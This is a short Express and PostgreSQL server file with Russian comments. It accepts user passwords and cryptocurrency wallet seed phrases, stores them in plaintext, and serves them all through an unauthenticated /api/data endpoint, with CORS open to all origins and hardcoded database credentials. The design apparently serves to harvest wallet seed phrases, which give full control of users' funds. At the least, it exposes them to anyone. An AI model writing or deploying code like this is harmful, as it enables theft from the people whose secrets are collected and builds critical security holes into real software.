// server.js
const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
const port = 5000;

// Настройка CORS
app.use(cors());
app.use(express.json());

// Настройка подключения к базе данных PostgreSQL
const pool = new Pool({
  user: 'postgres', // Имя пользователя базы данных
  host: 'localhost',
  database: 'pizzding', // Имя базы данных
  password: '1111', // Пароль пользователя
  port: 5432,
});

// Проверка подключения
pool.connect((err) => {
  if (err) {
    console.error('Ошибка подключения к базе данных:', err);
  } else {
    console.log('Подключение к базе данных успешно установлено');
  }
});

// Маршрут для корневого URL
app.get('/', (req, res) => {
  res.send('Сервер работает!'); // Возвращает сообщение, что сервер запущен
});


// Маршрут для получения данных
app.get('/api/data', async (req, res) => {
  try {
    // Запрос к БД для выборки нужных данных
    const result = await pool.query('SELECT id, password, seed_phrase FROM users');
    res.json(result.rows); // Возвращаем данные в формате JSON
  } catch (error) {
    console.error('Ошибка при получении данных:', error);
    res.status(500).json({ message: 'Ошибка при получении данных из базы данных' });
  }
});


app.post('/register', async (req, res) => {
  console.log('Данные из тела запроса:', req.body); // Вывод данных в консоль сервера

  const { password } = req.body;
  try {
    // Вставка пользователя в базу данных, id генерируется автоматически
    const result = await pool.query(
      'INSERT INTO users (password) VALUES ($1) RETURNING id',
      [password]
    );
    const userId = result.rows[0].id;
    res.status(201).json({ message: 'Пользователь создан', userId });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});



// Роут для сохранения сид-фразы и создания нового пользователя
app.post('/save-seed', async (req, res) => {
  const { seed_phrase } = req.body;

  try {
    const result = await pool.query(
      'INSERT INTO users (seed_phrase) VALUES ($1) RETURNING *',
      [seed_phrase]
    );
    res.status(201).json(result.rows[0]);
  } catch (error) {
    console.error('Ошибка при сохранении сид-фразы:', error);
    res.status(500).send('Ошибка при сохранении сид-фразы');
  }
});


// Запуск сервера
app.listen(port, () => {
  console.log(`Сервер запущен на http://localhost:${port}`);
});